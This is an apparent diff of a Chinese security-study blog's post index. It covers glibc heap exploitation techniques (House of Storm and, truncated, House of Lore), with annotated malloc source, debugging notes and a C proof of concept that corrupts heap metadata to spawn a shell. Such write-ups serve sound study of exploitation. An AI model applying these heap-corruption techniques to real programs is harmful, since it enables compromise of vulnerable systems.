-<h2 id="源码调试demo"><a href="#源码调试demo" class="headerlink" title="源码调试demo"></a>源码调试demo</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">struct {</span><br><span class="line">    unsigned long  presize;</span><br><span class="line">    unsigned long  size;</span><br><span class="line">    unsigned long  fd;</span><br><span class="line">    unsigned long  bk;</span><br><span class="line">    unsigned long  fd_nextsize;</span><br><span class="line">    unsigned long  bk_nextsize;</span><br><span class="line">}chunk;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">{</span><br><span class="line">    unsigned long *large_chunk,*unsorted_chunk;</span><br><span class="line">    unsigned long *fake_chunk = (unsigned long *)&amp;chunk;</span><br><span class="line">    char *ptr;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    unsorted_chunk=malloc(0x418);</span><br><span class="line">    malloc(0X20);</span><br><span class="line">    large_chunk=malloc(0x408);</span><br><span class="line">    malloc(0x20);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    free(large_chunk);</span><br><span class="line">    free(unsorted_chunk);</span><br><span class="line">    unsorted_chunk=malloc(0x418);</span><br><span class="line">    free(unsorted_chunk);  </span><br><span class="line"></span><br><span class="line">    unsorted_chunk[1] = (unsigned long )fake_chunk;</span><br><span class="line">    large_chunk[1]    = (unsigned long )fake_chunk+8;</span><br><span class="line">    large_chunk[3]    = (unsigned long )fake_chunk-0x18-5;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ptr=malloc(0x48);</span><br><span class="line">    strncpy(ptr, "/bin/sh\x00", 0x10);</span><br><span class="line">    system(((char *)fake_chunk + 0x10));</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
-
-<p>布局unsorted bin和large bin</p>
-<pre><code>unsorted_chunk=malloc(0x418);
-malloc(0X20);
-large_chunk=malloc(0x408);
-malloc(0x20);
-
-free(large_chunk);
-free(unsorted_chunk);
-unsorted_chunk=malloc(0x418);
-free(unsorted_chunk); 
-</code></pre>
-<p><img src="/pic/house_of_storm/1.png" alt="img"></p>
-<pre><code>unsorted_chunk[1] = (unsigned long )fake_chunk;
-large_chunk[1]    = (unsigned long )fake_chunk+8;
-large_chunk[3]    = (unsigned long )fake_chunk-0x18-5;
-</code></pre>
-<p>修改使满足attack的条件</p>
-<p><img src="/pic/house_of_storm/2.png" alt="img"></p>
-<p>malloc(0x20);</p>
-<p>接下来这一步就是关键，既然触发了unsorted bin attack也触发了large bin attack</p>
-<p>我们通过调试_int_malloc</p>
-<p><img src="/pic/house_of_storm/3.png" alt="img"></p>
-<p>发现程序执行下面这段，也就是unsorted bin attack攻击的位置</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">while` `((victim ``=` `unsorted_chunks (av)``-``&gt;bk) !``=` `unsorted_chunks (av))  ``/``/``从unsortbin第一个chunk（队尾）开始顺着bk指针向前遍历</span><br><span class="line">    ``{</span><br><span class="line">     ``bck ``=` `victim``-``&gt;bk;            ``/``/``bck是倒数第二个，victim是倒数第一个</span><br><span class="line">     ``/``/``size check</span><br><span class="line">     ``if` `(__builtin_expect (victim``-``&gt;size &lt;``=` `2` `*` `SIZE_SZ, ``0``)</span><br><span class="line">       ``|| __builtin_expect (victim``-``&gt;size &gt; av``-``&gt;system_mem, ``0``))</span><br><span class="line">      ``malloc_printerr (check_action, ``"malloc(): memory corruption"``,</span><br><span class="line">               ``chunk2mem (victim), av);</span><br><span class="line">     ``size ``=` `chunksize (victim);      ``/``/``取出最victim的size</span><br></pre></td></tr></tbody></table></figure>
-
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">``/``*</span><br><span class="line">  ``If a small request, ``try` `to use last remainder ``if` `it ``is` `the</span><br><span class="line">  ``only chunk ``in` `unsorted ``bin``. This helps promote locality ``for</span><br><span class="line">  ``runs of consecutive small requests. This ``is` `the only</span><br><span class="line">  ``exception to best``-``fit, ``and` `applies only when there ``is</span><br><span class="line">  ``no exact fit ``for` `a small chunk.</span><br><span class="line"> ``*``/</span><br><span class="line">``/``/``last remainder first</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/pic/house_of_storm/4.png" alt="img"></p>
-<p>然后在执行到large bin attack的位置</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">if ((unsigned long) size == (unsigned long) fwd-&gt;size)</span><br><span class="line">/ *Always</span><br><span class="line">insert in the</span><br><span class="line">second</span><br><span class="line">position. * /</span><br><span class="line">fwd = fwd-&gt;fd;</span><br><span class="line">else</span><br><span class="line">{</span><br><span class="line">    victim-&gt;fd_nextsize = fwd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;bk_nextsize = victim;</span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">}</span><br><span class="line">bck = fwd-&gt;bk;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">else</span><br><span class="line">victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">mark_bin(av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/pic/house_of_storm/5.png" alt="img"></p>
-<p>再执行完large bin attack后，可以看fake chunk</p>
-<p><img src="/pic/house_of_storm/6.png" alt="img"></p>
-<p>接下来继续走看那个检测，这里是0x55按理是过不了检测的</p>
-<p><img src="/pic/house_of_storm/7.png" alt="img"></p>
-<p><img src="/pic/house_of_storm/8.png" alt="img"></p>
-<p>如果是0x56就可以过check了</p>
-<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>一般我们触发攻击的attack是   add(0x48)，这里是因为fake_chunk的size是0x56或者0x55被视为是在0x50的范围，而如果是0x48的话就可以取出堆块，我们一般的攻击思路是覆盖hook函数挂上ogg，但是有没有想过如果不是0x48而是0x47或者0x45呢也是可以取出堆块的因为会被视为0x50，但是在attack也就是覆盖地址上会出现问题这里用一道题目的最后部分进行演示</p>
-<p>这是add(0x45)的情况</p>
-<p><img src="/pic/house_of_storm/9.png" alt="img"></p>
-<p>少了两字节</p>
-<p>这是add(0x46)的情况</p>
-<p><img src="/pic/house_of_storm/10.png" alt="img"></p>
-<p>少了一字节</p>
-<p>所以我们add(0x48)和add(0x47)都是可以的</p>
-<p>参考文章：</p>
-<p><a href="https://www.cnblogs.com/tolele/p/16728502.html">堆Pwn：House Of Storm利用手法 - tolele - 博客园 (cnblogs.com)</a></p>
-<p>[<a href="https://bbs.kanxue.com/thread-262423.htm">原创]unsortbin attack分析与总结-二进制漏洞-看雪-安全社区|安全招聘|kanxue.com</a></p>
-<p><a href="https://xz.aliyun.com/t/12673?time__1311=mqmhDvqIxUxGxWqGNveequtjD8jDkY/GCYeD&amp;alichlgref=https://www.bing.com/#toc-6">House Of Storm - 先知社区 (aliyun.com)</a> </p>
-]]></content>
-      <categories>
-        <category>pwn学习</category>
-        <category>堆利用</category>
-      </categories>
-      <tags>
-        <tag>house_of</tag>
+        <tag>漏洞复现---登录验证绕过</tag>
       </tags>
   </entry>
   <entry>
@@ -683,6 +753,218 @@ large_chunk[3]    = (unsigned long )fake_chunk-0x18-5;
       </categories>
       <tags>
         <tag>house of</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>house-of-storm</title>
+    <url>/2024/08/15/house%20of%20storm/</url>
+    <content><![CDATA[<h2 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h2><p>House Of Storm 结合了 unsortedbin attack 和 Largebin attack 的攻击技术，其基本原理和 Largebin attack 类似，可以达到任意地址写的效果,感觉就是在原有的unsorted bin attack的过程加上了一个large bin attack攻击去修改size使得 unsorted bin 可以成功返回</p>
+<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>1.glibc版本小于2.30,因为2.30之后加入了检查，unsorted bin attack无法使用<br>2.需要攻击者在largebin和unsorted_bin中分别布置一个chunk 这两个chunk需要在归位之后处于同一个largebin的index中,且unsortedbin中的chunk要比largebin中的大<br>3.需要unsorted_bin中的bk指针可控<br>4.需要largebin中的bk指针和bk_nextsize指针可控</p>
+<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>这里引用了Rookle师傅对于源码的注释</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">//#define unsorted_chunks(M)          (bin_at (M, 1))</span><br><span class="line">//如果unsorted bins不为空，从尾到头遍历unsorted bin中的每个chunk</span><br><span class="line">while ((victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av)) </span><br><span class="line">{</span><br><span class="line">    bck = victim-&gt;bk;//取出unsorted的尾部的chunk</span><br><span class="line">    /*</span><br><span class="line">        检查当前遍历的 chunk 是否合法，chunk 的大小不能小于等于 2 * SIZE_SZ，</span><br><span class="line">        也不能超过 该分配区总的内存分配量。然后获取 chunk 的大小并赋值给 size。</span><br><span class="line">        这里的检查似乎有点小问题，直接使用了 victim-&gt;size，但 victim-&gt;size </span><br><span class="line">        中包含了相关的标志位信息，使用 chunksize(victim) 才比较合理，但在 </span><br><span class="line">        unsorted bin 中的空闲 chunk 的所有标志位都清零了，所以这里直接 </span><br><span class="line">        victim-&gt;size 没有问题。</span><br><span class="line">    */</span><br><span class="line">    if (__builtin_expect(victim-&gt;size &lt;= 2 * SIZE_SZ, 0)</span><br><span class="line">        || __builtin_expect(victim-&gt;size &gt; av-&gt;system_mem, 0))</span><br><span class="line">        malloc_printerr(check_action, "malloc(): memory corruption",</span><br><span class="line">                        chunk2mem(victim), av);</span><br><span class="line"></span><br><span class="line">    size = chunksize(victim);//获取victim的size</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">        如果要申请的大小在smallbin范围 且 unsorted chunks 只有一个chunk，且</span><br><span class="line">        victim是last_remainder 且 victim的size大于请求的chunk的大小nb加上</span><br><span class="line">        (MINSIZE)最小chunk的size,那么就切割remainder,然后返回victim。</span><br><span class="line"></span><br><span class="line">        last_remainder 是一个 chunk 指针，分配区上次分配 small chunk 时，</span><br><span class="line">        从一个 chunk 中分 裂出一个 small chunk 返回给用户，分裂后的剩余部分</span><br><span class="line">        形成一个 chunk，last_remainder 就是 指向的这个 chunk。</span><br><span class="line">    */</span><br><span class="line">    if (in_smallbin_range(nb) &amp;&amp;</span><br><span class="line">        bck == unsorted_chunks(av) &amp;&amp;</span><br><span class="line">        victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">        (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE)) {</span><br><span class="line"></span><br><span class="line">        //分割remainder</span><br><span class="line">        remainder_size = size - nb;//计算分割后剩下的size</span><br><span class="line">        remainder = chunk_at_offset(victim, nb);//获取remainder的地址</span><br><span class="line">        //把remainder加入unsorted bin中</span><br><span class="line">        unsorted_chunks(av)-&gt;bk = unsorted_chunks(av)-&gt;fd = remainder;</span><br><span class="line">        av-&gt;last_remainder = remainder; // 设置last_remainder为remainder</span><br><span class="line">        remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks(av);</span><br><span class="line">        //如果是remainder在large bin的范围，则把fd_nextsize,fd_nextsize清零</span><br><span class="line">        if (!in_smallbin_range(remainder_size)) {</span><br><span class="line">            remainder-&gt;fd_nextsize = NULL;</span><br><span class="line">            remainder-&gt;fd_nextsize = NULL;</span><br><span class="line">        }</span><br><span class="line">        //设置victim的size</span><br><span class="line">        set_head(victim, nb | PREV_INUSE |</span><br><span class="line">                 (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br><span class="line">        //设置remainder的size</span><br><span class="line">        set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">        //设置remainder的物理相邻的下一个chunk的prev_size</span><br><span class="line">        set_foot(remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">        check_malloced_chunk(av, victim, nb);//默认不做任何操作</span><br><span class="line">        void *p = chunk2mem(victim);//将chunk指针转化为mem指针</span><br><span class="line">        alloc_perturb(p, bytes);//将p的mem部分全部设置为bytes ,默认什么也不做</span><br><span class="line">        return p;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //把victim从unsorted bin 中移除</span><br><span class="line">    unsorted_chunks(av)-&gt;bk = bck;</span><br><span class="line">    bck-&gt;fd = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line">    //如果 victim 的size 与申请的size相等，那么就返回其。</span><br><span class="line">    if (size == nb) {</span><br><span class="line">        //设置victim物理相邻的下一个chunk的prev_inuse位</span><br><span class="line">        set_inuse_bit_at_offset(victim, size);</span><br><span class="line">        //如果av不是main_arena 也就是说如果不是主进程,设置NON_MAIN_ARENA位</span><br><span class="line">        if (av != &amp;main_arena)</span><br><span class="line">            victim-&gt;size |= NON_MAIN_ARENA; </span><br><span class="line"></span><br><span class="line">        check_malloced_chunk(av, victim, nb); // 默认不做任何操作</span><br><span class="line">        void *p = chunk2mem(victim);//把chunk转换为mem指针</span><br><span class="line">        alloc_perturb(p, bytes);//将p的mem部分全部设置为bytes ,默认什么也不做</span><br><span class="line">        return p;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //如果上一步取出的chunk没有匹配成功，那么将该chunk放入对应的bin中</span><br><span class="line">    //如果在smallbin的范围,则放到对应多small bin中</span><br><span class="line">    if (in_smallbin_range(size)) </span><br><span class="line">    {</span><br><span class="line">        victim_index = smallbin_index(size);//获取size对应的smallbin的index</span><br><span class="line">        bck = bin_at(av, victim_index);//bck指向size对应的smallbin的链表头</span><br><span class="line">        //fwd指向size对应的smallbin的链表中的新加入的chunk(small bin使用头插法)</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">    }</span><br><span class="line">    else//如果不再smallbin的范围，也就是说在large bin 的范围</span><br><span class="line">    {</span><br><span class="line">        victim_index = largebin_index(size);//获取size对应的large bin的index</span><br><span class="line">        bck = bin_at(av, victim_index);//bck指向size对应的large bin的链表头</span><br><span class="line">        fwd = bck-&gt;fd;//fwd指向size对应的large bin的链表中的新加入的chunk</span><br><span class="line"></span><br><span class="line">        //如果large bin 非空，在largbin进行按顺序插入</span><br><span class="line">        if (fwd != bck) {</span><br><span class="line">            /* Or with inuse bit to speed comparisons */</span><br><span class="line">            size |= PREV_INUSE;</span><br><span class="line">            assert((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == 0);//默认不启用assert</span><br><span class="line">            /*</span><br><span class="line">                large bin中的chunk是按从大到小排列的，如果size &lt; large bin </span><br><span class="line">                的最后一个chunk，说明size是这个large bin中的最小的，我们把它</span><br><span class="line">                加入到此large bin尾部。</span><br><span class="line">            */</span><br><span class="line">            if ((unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size)) {</span><br><span class="line"></span><br><span class="line">                fwd = bck;</span><br><span class="line">                bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                /*</span><br><span class="line">                large bin 中size最小的chunk的fd_nextsize会指向size最大的</span><br><span class="line">                那个chunk，也就是首部的chunk。同样，large bin 中size最大的</span><br><span class="line">                chunk的bk_nextsize会指向size最小的那个chunk。</span><br><span class="line">                victim的bk_nextsize指向large bin原来最小的chunk，它的</span><br><span class="line">                bk_nextsize指向最大的那个chunk。那么原来的最小的就成了第二小的了。</span><br><span class="line">                把它fd_nextsize和bk_nextsize都修正。</span><br><span class="line">                */</span><br><span class="line">                victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                //最大size的chunk的bk_nextsize，和原来最小chunk的bk_nextsize都指向victim</span><br><span class="line">                fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            } </span><br><span class="line">            else //如果victim不是large bin 中最小的chunk</span><br><span class="line">            {</span><br><span class="line">                assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0);//默认不启用assert</span><br><span class="line">                //从大到小（从头到尾）找到合适的位置</span><br><span class="line">                while ((unsigned long) size &lt; fwd-&gt;size) {</span><br><span class="line">                    fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                    assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0);</span><br><span class="line">                }</span><br><span class="line">                //如果size刚好相等，就直接加入到其后面省的改fd_nextsize和bk_nextsize了</span><br><span class="line">                if ((unsigned long) size == (unsigned long) fwd-&gt;size)</span><br><span class="line">                    fwd = fwd-&gt;fd;</span><br><span class="line">                else </span><br><span class="line">                {</span><br><span class="line">                    //size不相等，即size&gt;fwd-&gt;size，把victim加入到纵向链表中</span><br><span class="line">                    victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                    fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                }</span><br><span class="line">                bck = fwd-&gt;bk;</span><br><span class="line">            }</span><br><span class="line">        } </span><br><span class="line">        else //如果large bin 为空，将victim加入到纵向列表</span><br><span class="line">            victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    //#define mark_bin(m, i)    ((m)-&gt;binmap[idx2block (i)] |= idx2bit (i))</span><br><span class="line">    mark_bin(av, victim_index); //把victim加入到的bin的表示为非空</span><br><span class="line">    //把victim加入到large bin的链表中</span><br><span class="line">    victim-&gt;bk = bck;</span><br><span class="line">    victim-&gt;fd = fwd;</span><br><span class="line">    fwd-&gt;bk = victim;</span><br><span class="line">    bck-&gt;fd = victim;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p>在unsorted bin中的chunk脱链，然后链接到large bin的过程中，可以同时进行这两种攻击。为之，所以我们需要在large bin中布置一个chunk，并且在unsorted bin中布置一个size稍大于largebin的chunk，使其能够链接在large bin中chunk的后面。</p>
+<p>house of storm中，unsorted bin attack主要用到的是unsorted_chunks(av) → bk同时也被赋值为了fake（只是一个记号）。在下次申请chunk，使其进入unsorted bin的分支时，也就是利用unsorted bin attack后,bk会指向target_addr,victim = unsorted_chunks(av) → bk（即fake），<strong>紧接着会有一个分支检查其size是否满足申请</strong>。只要满足了，则会直接分配fake处为chunk返回。</p>
+<p>我们已经知道largebin attack是向任意地址赋值堆地址。在64字长的系统中，地址寻址为8字节，但堆地址只占5个字节，而特别的是仅已0x55或0x56开头。那么只要我们通过largebin attack向fake + 0x3处，赋值一个堆地址，则以fake为chunk的size处为0x55或者0x56。这样，就成功的修改了size</p>
+<p>用图简单表示的话</p>
+<p><img src="/pic/house_of_storm/0.png" alt="img"></p>
+<h2 id="导致crash的原因："><a href="#导致crash的原因：" class="headerlink" title="导致crash的原因："></a>导致crash的原因：</h2><p>在通过调试demo的时候我们发现有的时候是可以通过的，有的时候是不行的，通过调试发现，无法通过的时候是因为fake_chunk的size为0x55 只有为0x56的时候可以通过 对应的源码在_int_malloc返回到_libc_malloc</p>
+<p>/*<br>    #define arena_for_chunk(ptr) <br>        (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)-&gt;ar_ptr : &amp;main_arena)</p>
+<pre><code>过以下检测需要满足的要求，只需满足一条即可
+1. victim 为 0
+2. IS_MMAPPED 为 1
+3. NON_MAIN_ARENA 为 0
+</code></pre>
+<p>*/<br>assert(!victim || chunk_is_mmapped(mem2chunk(victim))<br>       || ar_ptr == arena_for_chunk(mem2chunk(victim)));</p>
+<p>0x56：0101 0110，满足第二个。</p>
+<p>0x55：0101 0101，不满足，会报错。</p>
+<h2 id="源码调试demo"><a href="#源码调试demo" class="headerlink" title="源码调试demo"></a>源码调试demo</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">struct {</span><br><span class="line">    unsigned long  presize;</span><br><span class="line">    unsigned long  size;</span><br><span class="line">    unsigned long  fd;</span><br><span class="line">    unsigned long  bk;</span><br><span class="line">    unsigned long  fd_nextsize;</span><br><span class="line">    unsigned long  bk_nextsize;</span><br><span class="line">}chunk;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">{</span><br><span class="line">    unsigned long *large_chunk,*unsorted_chunk;</span><br><span class="line">    unsigned long *fake_chunk = (unsigned long *)&amp;chunk;</span><br><span class="line">    char *ptr;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    unsorted_chunk=malloc(0x418);</span><br><span class="line">    malloc(0X20);</span><br><span class="line">    large_chunk=malloc(0x408);</span><br><span class="line">    malloc(0x20);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    free(large_chunk);</span><br><span class="line">    free(unsorted_chunk);</span><br><span class="line">    unsorted_chunk=malloc(0x418);</span><br><span class="line">    free(unsorted_chunk);  </span><br><span class="line"></span><br><span class="line">    unsorted_chunk[1] = (unsigned long )fake_chunk;</span><br><span class="line">    large_chunk[1]    = (unsigned long )fake_chunk+8;</span><br><span class="line">    large_chunk[3]    = (unsigned long )fake_chunk-0x18-5;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ptr=malloc(0x48);</span><br><span class="line">    strncpy(ptr, "/bin/sh\x00", 0x10);</span><br><span class="line">    system(((char *)fake_chunk + 0x10));</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>布局unsorted bin和large bin</p>
+<pre><code>unsorted_chunk=malloc(0x418);
+malloc(0X20);
+large_chunk=malloc(0x408);
+malloc(0x20);
+
+free(large_chunk);
+free(unsorted_chunk);
+unsorted_chunk=malloc(0x418);
+free(unsorted_chunk); 
+</code></pre>
+<p><img src="/pic/house_of_storm/1.png" alt="img"></p>
+<pre><code>unsorted_chunk[1] = (unsigned long )fake_chunk;
+large_chunk[1]    = (unsigned long )fake_chunk+8;
+large_chunk[3]    = (unsigned long )fake_chunk-0x18-5;
+</code></pre>
+<p>修改使满足attack的条件</p>
+<p><img src="/pic/house_of_storm/2.png" alt="img"></p>
+<p>malloc(0x20);</p>
+<p>接下来这一步就是关键，既然触发了unsorted bin attack也触发了large bin attack</p>
+<p>我们通过调试_int_malloc</p>
+<p><img src="/pic/house_of_storm/3.png" alt="img"></p>
+<p>发现程序执行下面这段，也就是unsorted bin attack攻击的位置</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">while` `((victim ``=` `unsorted_chunks (av)``-``&gt;bk) !``=` `unsorted_chunks (av))  ``/``/``从unsortbin第一个chunk（队尾）开始顺着bk指针向前遍历</span><br><span class="line">    ``{</span><br><span class="line">     ``bck ``=` `victim``-``&gt;bk;            ``/``/``bck是倒数第二个，victim是倒数第一个</span><br><span class="line">     ``/``/``size check</span><br><span class="line">     ``if` `(__builtin_expect (victim``-``&gt;size &lt;``=` `2` `*` `SIZE_SZ, ``0``)</span><br><span class="line">       ``|| __builtin_expect (victim``-``&gt;size &gt; av``-``&gt;system_mem, ``0``))</span><br><span class="line">      ``malloc_printerr (check_action, ``"malloc(): memory corruption"``,</span><br><span class="line">               ``chunk2mem (victim), av);</span><br><span class="line">     ``size ``=` `chunksize (victim);      ``/``/``取出最victim的size</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">``/``*</span><br><span class="line">  ``If a small request, ``try` `to use last remainder ``if` `it ``is` `the</span><br><span class="line">  ``only chunk ``in` `unsorted ``bin``. This helps promote locality ``for</span><br><span class="line">  ``runs of consecutive small requests. This ``is` `the only</span><br><span class="line">  ``exception to best``-``fit, ``and` `applies only when there ``is</span><br><span class="line">  ``no exact fit ``for` `a small chunk.</span><br><span class="line"> ``*``/</span><br><span class="line">``/``/``last remainder first</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/pic/house_of_storm/4.png" alt="img"></p>
+<p>然后在执行到large bin attack的位置</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">if ((unsigned long) size == (unsigned long) fwd-&gt;size)</span><br><span class="line">/ *Always</span><br><span class="line">insert in the</span><br><span class="line">second</span><br><span class="line">position. * /</span><br><span class="line">fwd = fwd-&gt;fd;</span><br><span class="line">else</span><br><span class="line">{</span><br><span class="line">    victim-&gt;fd_nextsize = fwd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;bk_nextsize = victim;</span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">}</span><br><span class="line">bck = fwd-&gt;bk;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">else</span><br><span class="line">victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">mark_bin(av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/pic/house_of_storm/5.png" alt="img"></p>
+<p>再执行完large bin attack后，可以看fake chunk</p>
+<p><img src="/pic/house_of_storm/6.png" alt="img"></p>
+<p>接下来继续走看那个检测，这里是0x55按理是过不了检测的</p>
+<p><img src="/pic/house_of_storm/7.png" alt="img"></p>
+<p><img src="/pic/house_of_storm/8.png" alt="img"></p>
+<p>如果是0x56就可以过check了</p>
+<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>一般我们触发攻击的attack是   add(0x48)，这里是因为fake_chunk的size是0x56或者0x55被视为是在0x50的范围，而如果是0x48的话就可以取出堆块，我们一般的攻击思路是覆盖hook函数挂上ogg，但是有没有想过如果不是0x48而是0x47或者0x45呢也是可以取出堆块的因为会被视为0x50，但是在attack也就是覆盖地址上会出现问题这里用一道题目的最后部分进行演示</p>
+<p>这是add(0x45)的情况</p>
+<p><img src="/pic/house_of_storm/9.png" alt="img"></p>
+<p>少了两字节</p>
+<p>这是add(0x46)的情况</p>
+<p><img src="/pic/house_of_storm/10.png" alt="img"></p>
+<p>少了一字节</p>
+<p>所以我们add(0x48)和add(0x47)都是可以的</p>
+<p>参考文章：</p>
+<p><a href="https://www.cnblogs.com/tolele/p/16728502.html">堆Pwn：House Of Storm利用手法 - tolele - 博客园 (cnblogs.com)</a></p>
+<p>[<a href="https://bbs.kanxue.com/thread-262423.htm">原创]unsortbin attack分析与总结-二进制漏洞-看雪-安全社区|安全招聘|kanxue.com</a></p>
+<p><a href="https://xz.aliyun.com/t/12673?time__1311=mqmhDvqIxUxGxWqGNveequtjD8jDkY/GCYeD&amp;alichlgref=https://www.bing.com/#toc-6">House Of Storm - 先知社区 (aliyun.com)</a> </p>
+]]></content>
+      <categories>
+        <category>pwn学习</category>
+        <category>堆利用</category>
+      </categories>
+      <tags>
+        <tag>house_of</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>house-of-lore</title>
+    <url>/2024/08/15/house%20of%20lore/</url>
+    <content><![CDATA[<h2 id="使用版本以及影响"><a href="#使用版本以及影响" class="headerlink" title="使用版本以及影响"></a>使用版本以及影响</h2><p>2.23-2.31(不包含2.31)</p>
+<p><strong>libc-2.23</strong></p>
+<p><strong>libc-2.27</strong></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">if (__glibc_unlikely (bck-&gt;fd != victim))</span><br></pre></td></tr></tbody></table></figure>
+
+<p>检查 fakechunk-&gt;FD 是不是 victim_chunk</p>
+<p><strong>libc-2.31</strong>（House Of Lore 被ban）</p>
+<h2 id="原理解析"><a href="#原理解析" class="headerlink" title="原理解析"></a>原理解析</h2><p>house of lore是通过small bin机制，去进行任意地址的chunk 分配</p>
+<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
+<li>House of Lore 利用的前提是需要控制 Small Bin Chunk 的bk指针，并且控制指定位置 chunk 的fd指针</li>
+</ul>
+<h2 id="源码解析"><a href="#源码解析" class="headerlink" title="源码解析"></a>源码解析</h2><p>在_int_malloc libc2.23版本的3405的位置</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">if (in_smallbin_range (nb))</span><br><span class="line">   {</span><br><span class="line">     idx = smallbin_index (nb);</span><br><span class="line">     bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">     if ((victim = last (bin)) != bin)</span><br><span class="line">       {</span><br><span class="line">         if (victim == 0) /* initialization check */</span><br><span class="line">           malloc_consolidate (av);</span><br><span class="line">         else</span><br><span class="line">           {</span><br><span class="line">             bck = victim-&gt;bk;</span><br><span class="line">if (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">               {</span><br><span class="line">                 errstr = "malloc(): smallbin double linked list corrupted";</span><br><span class="line">                 goto errout;</span><br><span class="line">               }</span><br><span class="line">             set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">             bin-&gt;bk = bck;</span><br><span class="line">             bck-&gt;fd = 